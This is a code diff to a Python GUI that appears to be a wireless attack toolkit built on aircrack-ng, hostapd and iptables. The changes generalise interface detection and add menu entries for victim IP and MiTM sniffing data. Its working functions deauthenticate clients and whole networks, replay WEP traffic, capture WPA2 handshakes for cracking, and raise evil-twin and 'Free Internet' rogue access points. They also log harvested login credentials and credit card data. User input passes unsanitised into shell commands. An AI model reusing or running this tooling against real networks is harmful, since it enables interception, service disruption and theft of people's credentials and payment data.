@@ -1,4 +1,6 @@
 import wx
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 #from scapy.all import *
 import commands, re
@@ -130,6 +132,8 @@ class Example(wx.Frame):
 		loginlog = logmenu.Append(-1, "Login Creds", "Check for login credentials")
 		WPA2_log = logmenu.Append(-1, "WPA2", "WPA2 Cracks")
 		WPA2ENT_log = logmenu.Append(-1, "WPA2ENT", "WPA2Ent Logs")
+		victim_IP_list = logmenu.Append(-1, "Victims IP", "Victim IP and Browser Info")
+		MiTM_data = logmenu.Append(1, "MiTM Sniff Data", "MiTM Sniff Data")
 		CC_log = logmenu.Append(-1, "Credit Card", "CC Logs")
 		session_log = logmenu.Append(-1,"HTTP Session Log", "HTTP Session Log")
 		db_log = logmenu.Append(-1,"Db Log", "DB Log")
@@ -138,7 +142,9 @@ class Example(wx.Frame):
 		################### About ###########
 		
 		aboutmenu = wx.Menu()
+		tutorials_help = aboutmenu.Append(-1, "Help/Tutorials")
 		abouttool = aboutmenu.Append(-1, "About Tool", "About Tool")
+		wifi_card_info = aboutmenu.Append(-1, "About your wifi card", "About your wifi card")
 		aboutme = aboutmenu.Append(-1, "About Author", "About me")
 		suggestions = aboutmenu.Append(-1, "Suggestions/feedback","Suggestions/feedback")
 		menubar.Append(aboutmenu,"About")
@@ -216,7 +222,15 @@ class Example(wx.Frame):
 		
 		self.Bind(wx.EVT_MENU, self.about_author, aboutme)
 		
+		self.Bind(wx.EVT_MENU, self.getVictimInfo, victim_IP_list)
+		
+		self.Bind(wx.EVT_MENU, self.MiTM_sniffing, MiTM_data)
+		
 		self.Bind(wx.EVT_MENU, self.suggestions, suggestions)
+		
+		self.Bind(wx.EVT_MENU, self.wifi_card_info, wifi_card_info)
+		
+		self.Bind(wx.EVT_MENU, self.helpMenu, tutorials_help)
 		
 		#self.Bind(wx.EVT_MENU, self.printme, attackitem)
 		
@@ -386,18 +400,24 @@ class Example(wx.Frame):
 		self.Close()
 		
 	def killall(self, e):
+		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+
+		m = re.search('[wma]\S*', out)
+
+		monitoring_interface =  m.group(0)
+		
 		os.system("airmon-ng check kill &")
 		os.system("kill  `ps aux | grep hostapd | head -1 | awk '{print $2}'`")
 		os.system("kill  `ps aux | grep dnsmasq | head -1 | awk '{print $2}'`")
-		os.system("airmon-ng stop mon0")
-		os.system("airmon-ng stop mon1")
-		os.system("airmon-ng stop mon2")
-		os.system("airmon-ng stop mon3")
-		os.system("airmon-ng stop wlan0mon")
+		
+		os.system("airmon-ng stop "+monitoring_interface)
+
 		os.system("kill  `ps aux | grep aircrack-ng | head -1 | awk '{print $2}'`")
 		os.system("kill  `ps aux | grep radiusd | head -1 | awk '{print $2}'`")
-		wx.MessageBox('Wait for 5 seconds', 'Info', wx.OK | wx.ICON_INFORMATION)
-		time.sleep(5)
+		wx.MessageBox('Wait for 3 seconds', 'Info', wx.OK | wx.ICON_INFORMATION)
+		time.sleep(3)
 		
 		wx.MessageBox('Done', 'Info', wx.OK | wx.ICON_INFORMATION)
 		
@@ -433,9 +453,16 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 		self.Close(True)
 	
 	def mapWireless(self, e):
-		os.system("ifconfig wlan0 up")
+		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+		m = re.search('[wma]\S*', out)
+		
+		iface = m.group(0)
+		
+		os.system("ifconfig "+iface+" up")
 		#os.system("airmon-ng stop mon0")
-		os.system("airmon-ng start wlan0")
+		os.system("airmon-ng start "+iface)
 		def ask(parent=None, message='', default_value=''):
 			
 			dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
@@ -446,7 +473,15 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 		
 		user = str(ask(message = 'Enter the name for the dump file\nHit Ctrl+C on Dump Window to Stop Scanning')).strip()
 		os.system('mkdir ' + user)
-		os.system("airodump-ng -w "+user+"/"+user+" mon0")
+		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+
+		m = re.search('[wma]\S*', out)
+
+		monitoring_interface =  m.group(0)
+		
+		os.system("airodump-ng -w "+user+"/"+user+" "+monitoring_interface)
 		
 		os.system("airgraph-ng -i "+user+"/"+user+"*.csv -o "+user+"/"+user+".png -g CAPR")
 		
@@ -480,6 +515,19 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 		
 		frm = authorwindows(None,'About Author')
 		frm.Show()
+	def getVictimInfo(self, e):
+		#~ print 'It should be printed'
+		import getVictimIP 
+		
+		getVictimIP.startSniff()
+		
+	def MiTM_sniffing(self, e):
+		#~ print 'importing MiTM sniffing'
+		import MiTM_sniffer
+		MiTM_sniffer.startSniff()
+		
+		
+		
 	
 	def Evil_Twin_Attack(self, e):
 		frm = EvilWindow(None, id=-1)
@@ -493,6 +541,9 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 		
 	def suggestions(self, e):
 		frm = suggestions(None,'Suggestions')
+		frm.Show()
+	def wifi_card_info(self, e):
+		frm = wifi_card_info(None, 'About Your Wireless Card')
 		frm.Show()
 	
 	def tshark_capture(self, e):
@@ -532,14 +583,23 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 			wx.MessageBox('Could not dowload the packages.\nPlease Connect to Internet', 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
 	def deauth_user(self, e):
 		proc = subprocess.Popen(["ifconfig", ""], stdout=subprocess.PIPE, shell=True)
-		(out, err) = proc.communicate()
+		(out2, err) = proc.communicate()
 		
-		if 'mon0' in out:
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		
+		(out, err) = proc.communicate()
+
+		m = re.search('[wma]\S*', out)
+
+		monitoring_interface =  m.group(0)
+		
+		if monitoring_interface in out2:
 			
 			#os.system("airmon-ng start wlan0")
 			ssid = str(self.ask(message = 'Enter the SSID')).strip()
 			MAC = str(self.ask(message = 'Enter the MAC')).strip()
-			os.system("aireplay-ng -0 10 -e "+ssid+" -c "+MAC+" mon0 --ignore-negative-one &") 
+			os.system("aireplay-ng -0 10 -e "+ssid+" -c "+MAC+" "+monitoring_interface+" --ignore-negative-one &")
+			print 'Aireplay against client is started' 
 		else:
 			wx.MessageBox('make sure you have mon0 interface', 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
 				
@@ -547,51 +607,69 @@ sh /usr/local/etc/raddb/certs/bootstrap'''
 	
 	def deauth_ssid(self, e):
 		proc = subprocess.Popen(["ifconfig", ""], stdout=subprocess.PIPE, shell=True)
-		(out, err) = proc.communicate()
+		(out2, err) = proc.communicate()
 		
-		if 'mon0' in out:
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		
+		(out, err) = proc.communicate()
+
+		m = re.search('[wma]\S*', out)
+
+		monitoring_interface =  m.group(0)
+				
+		if monitoring_interface in out2:
 			#os.system("airmon-ng start wlan0")
 			ssid = str(self.ask(message = 'Enter the SSID')).strip()
-			os.system("aireplay-ng -0 10 -e "+ssid+" mon0 --ignore-negative-one &") 
+			os.system("aireplay-ng -0 10 -e "+ssid+" "+monitoring_interface+" --ignore-negative-one &") 
+			print 'Aireplay against whole network started'
 			#~ os.system("airmon-ng stop mon0")
 		else:
-			wx.MessageBox('make sure you have mon0 interface', 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
+			wx.MessageBox('make sure you have monitoring interface up', 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
 			
 	################  FREE INTERNET ###############
 	def free_evil(self, e):
-		os.system("ifconfig wlan0 up")
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+		m = re.search('[wma]\S*', out)
+		
+		iface = m.group(0)
+		
+		os.system("ifconfig "+iface+" up")
 		proc = subprocess.Popen(["ifconfig", ""], stdout=subprocess.PIPE, shell=True)
 		(out, err) = proc.communicate()
 		
-		if 'wlan0' in out:
+		if iface in out:
 			os.system("ifconfig eth0 up")
+			
+			print 1
 
 			hostapd = open('hostapd-freenet.conf', 'wb')
 				#~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
-			config_file = "interface=wlan0\ndriver=nl80211\nssid=Free Internet\nchannel=1\n#enable_karma=1\n"
+			config_file = "interface="+iface+"\ndriver=nl80211\nssid=Free Internet\nchannel=1\n#enable_karma=1\n"
 			hostapd.write(config_file)
 			hostapd.close()
-			
+			print 2
 			os.system("gnome-terminal -x hostapd hostapd-freenet.conf &")
-			
+			print 3
 			os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
 			cat <<EOF > /etc/dnsmasq.conf
 log-facility=/var/log/dnsmasq.log
 #address=/#/10.0.0.1
 #address=/google.com/10.0.0.1
-interface=wlan0
+interface=%s
 dhcp-range=10.0.0.10,10.0.0.250,12h
 dhcp-option=3,10.0.0.1
 dhcp-option=6,10.0.0.1
 #no-resolv
 log-queries
-EOF""")
+EOF"""%iface)
+			print 4
 	
 			os.system("service dnsmasq start")
 	
 			
-			os.system("""ifconfig wlan0 up
-			ifconfig wlan0 10.0.0.1/24
+			os.system("""ifconfig """+iface+""" up
+			ifconfig """+iface+""" 10.0.0.1/24
 			iptables -t nat -F
 			iptables -F
 			iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
@@ -599,12 +677,16 @@ EOF""")
 			echo '1' > /proc/sys/net/ipv4/ip_forward""")
 			
 			wx.MessageBox('Free Internet SSID is launched', 'Info', wx.OK | wx.ICON_INFORMATION)
+			
+			#~ view_logs = wx.TextCtrl(self, -1, 'Logs are displayed here', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(680, 200),size=(500,600))
+			#~ view_logs.AppendText("This is the test string")
+		
 		elif 'eth0' not in out:
 			
 			wx.MessageBox('make sure you have eth0 interface', 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
 			
 		else:
-			wx.MessageBox('make sure you have wlan0 interface', 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
+			wx.MessageBox('make sure you have wlan interface', 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
 			
 	################ FREE INTERNET ################	
 		
@@ -613,16 +695,24 @@ EOF""")
 		
 		try:
 			
-			
-			
 			os.system("ifconfig wlan0 up")
+			os.system("ifconfig wlan1 up")
+			os.system("ifconfig wlan2 up")
+			os.system("ifconfig wlan3 up")
+			os.system("ifconfig wlan4 up")
+			proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+			(out, err) = proc.communicate()
+			m = re.search('[wma]\S*', out)
+			iface = m.group(0)
+			
+			os.system("ifconfig "+iface+" up")
 			
 			proc = subprocess.Popen(["ifconfig", ""], stdout=subprocess.PIPE, shell=True)
 			(out, err) = proc.communicate()
-			if 'wlan0' in out:
+			if iface in out:
 				
 				read_only_txt = wx.TextCtrl(self, -1, '**WIRELESS SCAN**\n', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
-				output = str(commands.getstatusoutput("iw wlan0 scan")[1])
+				output = str(commands.getstatusoutput("iw "+iface+" scan")[1])
 		
 				p = r'SSID: \S*|cipher: \S*|Authentication suites: \S*'
 				p = r'SSID: \S*|cipher: \S*'
@@ -643,10 +733,21 @@ EOF""")
 
 			
 		######################### probe scanner is ready #################
+	def helpMenu(self, e):
+		try:
+			os.system("firefox wiki/index.html &")
+		except:
+			wx.MessageBox('Oops, Somthing went wrong here.', 'Warning', wx.ICON_INFORMATION)
+				
+	
 	def probRequest(self, e):
 		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+		m = re.search('[wma]\S*', out)
+		iface = m.group(0)
 		os.system("echo '' > prob_request.txt")
-		os.system("ifconfig wlan0 up")
+		os.system("ifconfig "+iface+" up")
 		#~ os.system("airmon-ng start wlan0")
 		
 		print 'airmon-ng start is created'
@@ -655,7 +756,7 @@ EOF""")
 		
 		try:
 			
-			read_only_txt = wx.TextCtrl(self, -1, '**PROBE REQUEST**\n', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
+			read_only_txt = wx.TextCtrl(self, -1, '**Please Wait...\nNow Performing Probe Scan**\n', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
 			
 			#~ print 'the value is ' + prob_packets
 			
@@ -674,7 +775,7 @@ EOF""")
 			monitoring_interface =  m.group(0)			
 			os.system("airmon-ng stop "+str(monitoring_interface))
 		except:
-			wx.MessageBox('Perform Probe Scan First', 'Warning', wx.ICON_INFORMATION)
+			wx.MessageBox('Please try to Kill Srv', 'Warning', wx.ICON_INFORMATION)
 			
 			
 	######################### probe scanner is ready #################			
@@ -705,13 +806,28 @@ EOF""")
 		
 	def captureIV(self, e):
 		
-		os.system("ifconfig wlan0 up")
-		os.system("gnome-terminal -x airmon-ng start wlan0 &")
+		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+		m = re.search('[wma]\S*', out)
+		iface = m.group(0)
+		
+		os.system("ifconfig "+iface+" up")
+		os.system("gnome-terminal -x airmon-ng start "+iface+" &")
 		#~ print 'mon0 is created'
 		time.sleep(5)	
 		proc = subprocess.Popen(["ifconfig", ""], stdout=subprocess.PIPE, shell=True)
 		(out, err) = proc.communicate()
-		os.system("gnome-terminal -x airodump-ng mon0 &")
+		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		
+		(out2, err) = proc.communicate()
+
+		m = re.search('[wma]\S*', out2)
+
+		monitoring_interface =  m.group(0)
+		
+		os.system("gnome-terminal -x airodump-ng "+monitoring_interface+" &")
 		#~ print 'Attack is launched  is created'
 		if 'mon0' in out:
 				
@@ -724,19 +840,31 @@ EOF""")
 			ask_mac = str(ask(message = 'Enter the AP MAC Address')).strip()
 			self.target_mac = ask_mac
 			 
-			os.system("gnome-terminal -x airodump-ng -c 9 --bssid "+ask_mac+" -w output mon0 &")
+			os.system("gnome-terminal -x airodump-ng -c 9 --bssid "+ask_mac+" -w output "+monitoring_interface+" &")
 		else:
 			wx.MessageBox('mon0 doesn\'t exist', 'Warning', wx.ICON_INFORMATION)
 			
 	
 	def fakeAPauth(self, e):
+		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+		m = re.search('[wma]\S*', out)
+		iface = m.group(0)
 
-		os.system("ifconfig wlan0 up")
+		os.system("ifconfig "+iface+" up")
 			
 		proc = subprocess.Popen(["ifconfig", ""], stdout=subprocess.PIPE, shell=True)
 		(out, err) = proc.communicate()
 		
-		if 'mon0' in out:
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out2, err) = proc.communicate()
+
+		m = re.search('[wma]\S*', out2)
+
+		monitoring_interface =  m.group(0)
+		
+		if monitoring_interface in out:
 					
 			def ask(parent=None, message='', default_value=''):
 				dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
@@ -749,9 +877,9 @@ EOF""")
 			host_mac = str(ask(message = 'Enter the HOST MAC Address')).strip()
 			ssid = str(ask(message = 'Enter victim SSID')).strip()
 			 
-			os.system("gnome-terminal -x aireplay-ng -1 0 -e "+ssid+" -a "+ask_mac+" -h "+host_mac+" mon0 &")
+			os.system("gnome-terminal -x aireplay-ng -1 0 -e "+ssid+" -a "+ask_mac+" -h "+host_mac+" "+monitoring_interface+" &")
 		else:
-			wx.MessageBox('mon0 doesn\'t exist', 'Warning', wx.ICON_INFORMATION)
+			wx.MessageBox('monitor doesn\'t exist', 'Warning', wx.ICON_INFORMATION)
 	
 	def wep_replay(self, e):
 		try:
@@ -764,9 +892,16 @@ EOF""")
 				return result
 				
 			ask_mac = str(ask(message = 'Enter the AP MAC Address')).strip()
-			host_mac = str(ask(message = 'Enter the HOST MAC Address')).strip()		
+			host_mac = str(ask(message = 'Enter the HOST MAC Address')).strip()
 			
-			os.system("gnome-terminal -x aireplay-ng -3 -b "+ask_mac+" -h "+host_mac+" mon0 &")
+			proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+			(out, err) = proc.communicate()
+
+			m = re.search('[wma]\S*', out)
+
+			monitoring_interface =  m.group(0)
+			
+			os.system("gnome-terminal -x aireplay-ng -3 -b "+ask_mac+" -h "+host_mac+" "+monitoring_interface+" &")
 		except:
 			wx.MessageBox('Something went wrong', 'Warning', wx.ICON_INFORMATION)
 			
@@ -858,7 +993,13 @@ iptables -t nat -A POSTROUTING -j MASQUERADE
 #~ wpa_pairwise=TKIP CCMP""" %SSID
 		#~ 
 		
-		configuration = """interface=wlan0
+		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+		m = re.search('[wma]\S*', out)
+		iface = m.group(0)
+		
+		configuration = """interface=%s
 driver=nl80211
 ssid=%s
 country_code=DE
@@ -877,7 +1018,7 @@ wpa_key_mgmt=WPA-EAP
 channel=6
 wpa_pairwise=CCMP
 rsn_pairwise=CCMP
-""" %SSID
+""" %(iface,SSID)
 		
 		hostapd_conf = open('hostapd-wpe.conf', 'wb')
 		hostapd_conf.write(configuration)
@@ -890,7 +1031,13 @@ rsn_pairwise=CCMP
 		
 		time.sleep(5)
 		#~ print 'came back from sleep'
-		os.system("airmon-ng start wlan0 &")
+		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+		m = re.search('[wma]\S*', out)
+		iface = m.group(0)
+		
+		#~ os.system("airmon-ng start "+iface+" &")
 		#~ print 'airmong ng is started'
 		
 		
@@ -1186,6 +1333,12 @@ class suggestions(wx.Frame):
 		html = wx.html.HtmlWindow(self)
 		html.SetPage("For suggestions and all other questions email me @ 3ntr0py1337@gmail.com")
 		
+class wifi_card_info(wx.Frame):
+	def __init__(self, parent, title):
+		wx.Frame.__init__(self, parent, -1, title)
+		html = wx.html.HtmlWindow(self)
+		html.SetPage("Following is the information about the wireless card")
+		
 class EvilWindow(wx.Frame):
 	
 	
@@ -1265,15 +1418,19 @@ log-queries
 
 			os.system("service dnsmasq start")
 
-		
-			os.system("""ifconfig wlan0 up
-			ifconfig wlan0 10.0.0.1/24
+			proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+			(out, err) = proc.communicate()
+			m = re.search('[wma]\S*', out)
+			
+			iface = m.group(0)
+			os.system("""ifconfig %s up
+			ifconfig %s 10.0.0.1/24
 
 			iptables -t nat -F
 			iptables -F
 			iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 			iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
-			echo '1' > /proc/sys/net/ipv4/ip_forward""")
+			echo '1' > /proc/sys/net/ipv4/ip_forward"""%(iface, iface))
 			######## Debugging purpose
 			print 'IP table is created'
 			
@@ -1331,9 +1488,15 @@ class WPA2_crack(wx.Frame):
     
     def wireless_scan_cracker(self):
 		
-		os.system("ifconfig wlan0 up")
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+		m = re.search('[wma]\S*', out)
+		
+		iface = m.group(0)
+		
+		os.system("ifconfig "+iface+" up")
 		read_only_txt = wx.TextCtrl(self, -1, '', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
-		output = str(commands.getstatusoutput("iw wlan0 scan")[1])
+		output = str(commands.getstatusoutput("iw "+iface+" scan")[1])
 
 		#p = r'SSID: \S*|cipher: \S*|Authentication suites: \S*'
 		p = r'SSID: \S*|cipher: \S*'
@@ -1356,14 +1519,28 @@ class WPA2_crack(wx.Frame):
 				self.listbox.Append(i)
 
     def wpa_crack_key(self, SSID):
-		os.system("airmon-ng start wlan0")
+		
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		(out, err) = proc.communicate()
+		m = re.search('[wma]\S*', out)
+		
+		iface = m.group(0)
+		
+		os.system("airmon-ng start "+iface)
 		#os.system("mkdir capture")
 		print 'wpa2 hack is started'
 		
 		##os.system("airodump-ng --essid "+str(SSID)+" --write "+str(SSID)+"_crack mon0")
+		proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+		
+		(out, err) = proc.communicate()
+
+		m = re.search('[wma]\S*', out)
+
+		monitoring_interface =  m.group(0)
 		
 		#~ os.system("gnome-terminal -x airodump-ng --essid "+SSID+" --write capture/"+SSID+"_crack mon0")
-		os.system("airodump-ng --essid "+SSID+" --write capture/"+SSID+"_crack mon0 &")
+		os.system("airodump-ng --essid "+SSID+" --write capture/"+SSID+"_crack "+monitoring_interface+" &")
 		#os.system("airmon-ng stop mon0")
 		#print str(SSID)
 		
@@ -1518,10 +1695,16 @@ class infernal_wireless(wx.Frame):
 			os.system('firefox http://localhost/index.html &')
 			time.sleep(3)
 			
+			proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+			(out, err) = proc.communicate()
+			m = re.search('[wma]\S*', out)
+			
+			iface = m.group(0)
+			
 			#mon_interface = Popen(["airmon-ng", "start", wireless_interface], stdout=PIPE).communicate()[0]
 			hostapd = open('infernal-hostapd.conf', 'wb')
 			#~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
-			config_file = "interface=wlan0\ndriver=nl80211\nssid="+str(ssid)+"\nchannel=1\n#enable_karma=1\n"
+			config_file = "interface="+iface+"\ndriver=nl80211\nssid="+str(ssid)+"\nchannel=1\n#enable_karma=1\n"
 			hostapd.write(config_file)
 			hostapd.close()
 			os.system("gnome-terminal -x hostapd infernal-hostapd.conf &")
@@ -1563,9 +1746,15 @@ EOF""")
 #~ iptables --append FORWARD --in-interface at0 -j ACCEPT
 #~ iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
 #~ iptables -t nat -A POSTROUTING -j MASQUERADE""")
-
-			os.system("""ifconfig wlan0 up
-			ifconfig wlan0 10.0.0.1/24
+			
+			proc = subprocess.Popen(["ls /sys/class/net"], stdout=subprocess.PIPE, shell=True)
+			(out, err) = proc.communicate()
+			m = re.search('[wma]\S*', out)
+			
+			iface = m.group(0)
+			
+			os.system("""ifconfig """+iface+""" up
+			ifconfig """+iface+""" 10.0.0.1/24
 			iptables --flush
 			iptables --table nat --flush
 			iptables --delete-chain
@@ -1594,8 +1783,10 @@ def main():
 	
 	ex = wx.App()
 	Example(None)
-	
+	provider = wx.CreateFileTipProvider("wiki/tips.txt", 0)
+	wx.ShowTip(None, provider, True)
 	ex.MainLoop()
+	
 	
 
 if __name__ == '__main__':
